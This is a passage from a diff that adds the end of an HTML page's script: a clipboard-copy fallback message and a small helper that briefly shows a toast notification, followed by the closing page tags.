+  } catch(e) {
+    showToast('👆 Select all & copy manually');
+  }
+}
+
+function showToast(msg) {
+  var t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(function(){ t.classList.remove('show') }, 2500);
+}
+</script>
+
+</body>
+</html>
